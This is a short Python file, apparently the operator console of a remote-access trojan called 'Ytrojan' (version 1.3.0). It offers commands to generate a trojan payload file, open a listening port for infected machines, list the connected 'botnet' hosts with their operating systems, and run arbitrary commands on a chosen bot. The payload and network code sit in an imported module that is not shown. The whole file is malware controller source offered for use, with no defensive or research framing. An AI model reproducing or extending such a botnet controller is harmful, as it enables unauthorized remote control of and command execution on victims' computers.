# github.com/ycy20090311
# 2022.11.29

import threading
import YtrojanAPI

print("""
\033[31m __   ___             _             \033[0m             
\033[32m \ \ / / |_ _ __ ___ (_) __ _ _ __  \033[0m
\033[33m  \ V /| __| '__/ _ \| |/ _` | '_ \ \033[0m
\033[34m   | | | |_| | | (_) | | (_| | | | |\033[0m
\033[35m   |_|  \__|_|  \___// |\__,_|_| |_|\033[0m
\033[36m                   |__/             \033[0m   
\033[37m                                    \033[0m
\033[38m                         V 1.3.0.202211 \033[0m
""")

while True:
    Command = input("Ytrojan $>")
    if Command.split()[0] == "generate":
        Return = YtrojanAPI.Generate(Command.split()[1],Command.split()[2],Command.split()[3])
        if Return != "no":
            print("\033[32m[INFO] The file is generated successfully \033[0m")
        else:
            print("\033[31m[ERROR] File generation failed \033[0m")
    
    elif Command.split()[0] == "listen":
        threading.Thread(target=YtrojanAPI.Listen,args=(Command.split()[1],)).start()
        print("\033[32m[INFO] Open %s Port \033[0m" % Command.split()[1])
    
    elif Command.split()[0] == "botnet":
        BotSockets = list(YtrojanAPI.BotNet.keys())
        print("\033[32m[INFO] Botint | system\033[0m")
        for BotSocket in YtrojanAPI.BotNet:
            print("%s  |  %s" % (BotSockets.index(BotSocket),YtrojanAPI.BotNet[BotSocket]))
    
    elif Command.split()[0] == "run":
        print(YtrojanAPI.Run(BotSockets[int(Command.split()[1])],Command.split(" ",2)[2]))
    



